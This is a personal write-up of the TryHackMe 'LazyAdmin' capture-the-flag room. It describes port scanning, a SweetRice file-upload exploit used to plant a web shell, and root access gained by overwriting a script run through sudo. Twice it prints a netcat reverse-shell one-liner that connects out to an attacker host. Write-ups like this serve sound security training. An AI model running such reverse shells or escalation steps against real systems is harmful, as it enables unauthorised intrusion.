TryHackMe writeup: LazyAdmin

The LazyAdmin (2019) room was pretty interesting. I assumed that the admin was “lazy,” and ergo this challenge would be easy as a consequence. I was wrong, and found myself relying on a previous hacker’s writeup regarding this challenge.

Procedure

Network scanning

As with these boot2root machines, I booted up the LazyAdmin machine and began probing the machine. I ran an nmap scan with the following parameters:

$ nmap -sT -A -v -Pn -O -p- -oX tcp_scan.xml <target ip address>

The scan reported an OpenSSH service on port 22 and an Apache webserver on port 80.

File upload exploit

So I suppose that I should focus on exploiting the SweetRice web application. I tried monkeying around with the admin panel without any progress. So, looking back at SearchSploit’s results, I noticed another exploit called “SweetRice 1.5.1 — Arbitrary File Upload,” which I realised that I can use to upload a web-shell onto the web server.

So I decided to run the script, and got the following error:

Two important changes need to be made:

  • First, when the script asks for the host, username, password and filename, the input() function needs to be changed to raw_input()
  • Second, when inputting the host, only put in the <target ip address>/<sweetrice directory> minus the http:// bit. The script’s author already set to send web requests with the http:// prefix, and adding another “http://” will confuse the exploit script.

Alright, this is good. But now I need to figure out how to get root. After experimenting with logging into the MySQL database with credentials given by mysql_login.txt, and after failing to get Linux Smart Enumeration (Blanco, n.d.) onto the system because of strict directory permisions, I decided to instead focus on getting root access via the backup.pl script. The contents of the script are:

$ cat backup.pl
#!/usr/bin/perl
system(“sh”, “/etc/copy.sh”);

The /etc/copy.sh script looks interesting. Its contents are:

$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

I knew that I had to do something regarding this script to get root access, but I just could not put my finger on it. So, I tried researching these commands and eventually other writeups for a “hint.” I came across a writeup on this room by “MurilandOracle” (2020), and decided to pretty much duplicate their technique:

[ ... target machine ... ]
$ echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <target ip address> 5554 >/tmp/f” > /etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl

Summary

Despite the name, working out the flag here require a bit more skill than I was ready to dish out. I needed the help of “MurilandOracle” (2020), and I need to practice more in order to ascend into elite hacker status.

It is also worth noting that recently, “ippsec” and “0xdf” (2022) posited that beginners, such as myself, can reference writeups if they really are struggle to hack a simulation computer or network. I would add that one should try to hack a computer system on their own first before turning to a writeup. Also, be sure to give credit where credit is due if you decide to write up your own report ;-)

Lessons learnt

  • Exploits can sometimes break, so be sure to have a coding and debugging background to fix them ;-)
  • In absence of nano, vim or other terminal-based text editors, use echo to overwrite a file with a+rwx file permissions.
  • One should not rely too much on Linux Smart Enumeration (Blanco, n.d.) or Linux Exploit Suggester (“mzet,” n.d.). as sometimes directory permissions can be ultra restrictive.
  • Don’t underestimate “lazy” sysadmins as they can still be hard to r00t despite being lazy.
